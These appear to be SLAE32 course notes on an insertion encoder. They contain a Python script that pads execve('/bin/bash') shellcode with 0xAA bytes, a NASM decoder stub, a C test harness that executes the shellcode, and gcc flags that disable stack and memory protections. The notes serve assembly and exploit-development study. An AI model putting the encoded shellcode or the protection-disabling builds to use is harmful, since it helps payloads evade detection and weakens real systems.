# INSERT

## SHELL (PREP)
In order to understand how `execve` works, look at the arguments it takes, and how this translates to the registers:  

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
**execve does NOT need a return if successful**

```nasm
EAX = syscall
EBX = /bin/bash, 0x0
ECX = Address of /bin/bash, 0x00000000
EDX = 0x00000000
ESI -> /bin/bash
```

## Python (PREP)
Using the following Python3 script `Insertion-encoder.py` to encode the shellcode
```python
#!/usr/bin/python3
import random

# Python3 Insertion Encoder
# SLAE32

shellcode = (
# Place shellcode here
b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print ("Encoded shellcode with random insertion...\n")

for x in shellcode:
    encoded += "\\x"
    encoded += "%02x" % x
    encoded += "\\x%02x" % 0xAA     # Insert 0xAA after every single byte in shellcode

    # encoded += "\\x%02x" % random.randint(1,255)

    encoded2 += "0x"
    encoded2 += "%02x," % x
    encoded2 += "0x%02x," % 0xAA

    # encoded2 += "\\x%02x" % random.randint(1,255)

print(encoded)
print()
print(encoded2)
print()

print("Original shellcode length: %d" % len(shellcode))
print("Encoded shellcode length: %d" % (len(encoded)/4))
```

## NASM  

Level 6 (`EXECVE-Stack` shellcode) before `Insert` Encoding:
```nasm
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Level 6 (`EXECVE-Stack` shellcode) after `Insert` Encoding:
```nasm
"\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa"
```

### EXECVE  
```nasm
; EXECVE-Insert-decoder.nasm (JMP-CALL-POP)
; SLAE32
; INSERT Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "Insertion-encoder.py" to insert extra bytes in shellcode

global _start

section .text
_start: 
    jmp short call_shellcode


decoder:
    pop esi             ; Get address of EncodedShellcode

    ; EDI will be used (counter) to track the random bytes to be replaced
    lea edi, [esi + 1]  ; ESI +1 is the FIRST random inserted byte
    
    xor eax, eax
    mov al, 1
    
    xor ebx, ebx


decode:
    mov bl, byte [esi + eax]        ; ESI points to the string, EAX is the array index of the next random byte
    xor bl, 0xaa                    ; Once this is a non zero value JMP.  Using the 0xBB, 0xBB to work.
    jnz short EncodedShellcode

    mov bl, byte [esi + eax + 1]    ; Grabs the real, next piece of shellcode, skipping over the random inserts

    mov byte [edi], bl              ; Move the real shellcode, next to the previous piece of real shellcod, overwriting 0xAA

    inc edi                         ; Continue iteration through shellcode
    add al, 2                       ; Since 0xAA is at every 2nd offset
    jmp short decode


call_shellcode:
    call decoder
    ; Added two 0xbb at the END of EncodedShellcode
    EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x62,0xaa,0x61,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x2f,0xaa,0x2f,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb
```


---


## Convert to Shellcode  

Use the [compile.sh](../compile.sh) script that will automatically compile, assemble, link, and then print the shellcode for CPP consumption.  


---


## CPP  
### Header file (.h)  
```cpp
/*
Following video: Module 2-10: Insert encoder

    /mnt/git/NASM/SLAE32/2-10_INSERT/execve-insert-decoder:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       eb 1d                   jmp    804901f <call_shellcode>
    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       8d 7e 01                lea    edi,[esi+0x1]
     8049006:       31 c0                   xor    eax,eax
     8049008:       b0 01                   mov    al,0x1
     804900a:       31 db                   xor    ebx,ebx
    0804900c <decode>:
     804900c:       8a 1c 06                mov    bl,BYTE PTR [esi+eax*1]
     804900f:       80 f3 aa                xor    bl,0xaa
     8049012:       75 10                   jne    8049024 <EncodedShellcode>
     8049014:       8a 5c 06 01             mov    bl,BYTE PTR [esi+eax*1+0x1]
     8049018:       88 1f                   mov    BYTE PTR [edi],bl
     804901a:       47                      inc    edi
     804901b:       04 02                   add    al,0x2
     804901d:       eb ed                   jmp    804900c <decode>
    0804901f <call_shellcode>:
     804901f:       e8 de ff ff ff          call   8049002 <decoder>
    08049024 <EncodedShellcode>:
     8049024:       31 aa c0 aa 50 aa       xor    DWORD PTR [edx-0x55af5540],ebp
     804902a:       68 aa 62 aa 61          push   0x61aa62aa
     804902f:       aa                      stos   BYTE PTR es:[edi],al
     8049030:       73 aa                   jae    8048fdc <_start-0x24>
     8049032:       68 aa 68 aa 62          push   0x62aa68aa
     8049037:       aa                      stos   BYTE PTR es:[edi],al
     8049038:       69 aa 6e aa 2f aa       imul   ebp,DWORD PTR [edx-0x55d05592],0xaa2faa68
     804903e:       68 aa 2f aa 
     8049042:       2f                      das    
     8049043:       aa                      stos   BYTE PTR es:[edi],al
     8049044:       2f                      das    
     8049045:       aa                      stos   BYTE PTR es:[edi],al
     8049046:       2f                      das    
     8049047:       aa                      stos   BYTE PTR es:[edi],al
     8049048:       89 aa e3 aa 50 aa       mov    DWORD PTR [edx-0x55af551d],ebp
     804904e:       89 aa e2 aa 53 aa       mov    DWORD PTR [edx-0x55ac551e],ebp
     8049054:       89 aa e1 aa b0 aa       mov    DWORD PTR [edx-0x554f551f],ebp
     804905a:       0b aa cd aa 80 aa       or     ebp,DWORD PTR [edx-0x557f5533]
     8049060:       bb                      .byte 0xbb
     8049061:       bb                      .byte 0xbb
*/

unsigned char shellcode[] = {
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80"
"\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8"
"\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa"
"\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa"
"\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa"
"\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa"
"\xbb\xbb"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
```

### CPP file (.cpp)  
```cpp
#include <stdio.h>
#include <string.h>
#include <stdint.h>		// Requirement for intptr_t/uintptr_t
// @ts-ignore
#include <sys/mman.h>	// Linux requirement for mmap / mprotect

// Clean place to keep all shellcode
#include "shellcode.h"

// Compile (x86) with:
// Note: Requires package gcc-multilib if on an x64 system
// gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
//
// DISABLE ALL PROTECTIONS:
// gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
//
// Compile (x64) with:
// gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>

int main()
{
	for (int i = 0; i < shellcode_len; i++){
		// printf("%02x ",*(shellcode + i));	// Output example: 31 c0 50 68
		printf("\\x%02x",*(shellcode + i));		// Output example: \x31\xc0\x50\x68
	}
	printf("\n");
	printf("Shellcode Length: %d\n", shellcode_len);

	// =====================================================
	// SLAE-32 method
	// Create a function pointer, that points to the raw shellcode, then call the shellcode pointer
	//
	int (*shellcode_func_ptr)() = (int(*)())shellcode;
	mprotect((void*)((uintptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_WRITE|PROT_EXEC);	// Required to add this to make the PAGE the shellcode is in, executable
	printf("Shellcode address: %p\n", shellcode_func_ptr);
	shellcode_func_ptr();
	// =====================================================


	// =====================================================
	// Memory Alloc method
	//
	// int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	// int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	
	// void *shellcode_mem_alloc = mmap(0, shellcode_len, prot, flags, -1, 0);

	// if(shellcode_mem_alloc == MAP_FAILED)
	// {
	// 	perror("mmap");
	// 	return 1;	// Error'd out
	// }
	// else{
	// 	memcpy(shellcode_mem_alloc, shellcode, shellcode_len);
	// 	((void(*)())shellcode_mem_alloc)();
	// }
	// =====================================================


	return 0;
}
```


---

## Compilation (GCC)

### Compile (`x86`):
_Note: Requires package `gcc-multilib` if on an `x64` system_
```shell
gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
```

### DISABLE ALL PROTECTIONS:
```shell
gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
```

### Compile (`x64`):
```shell
gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>
```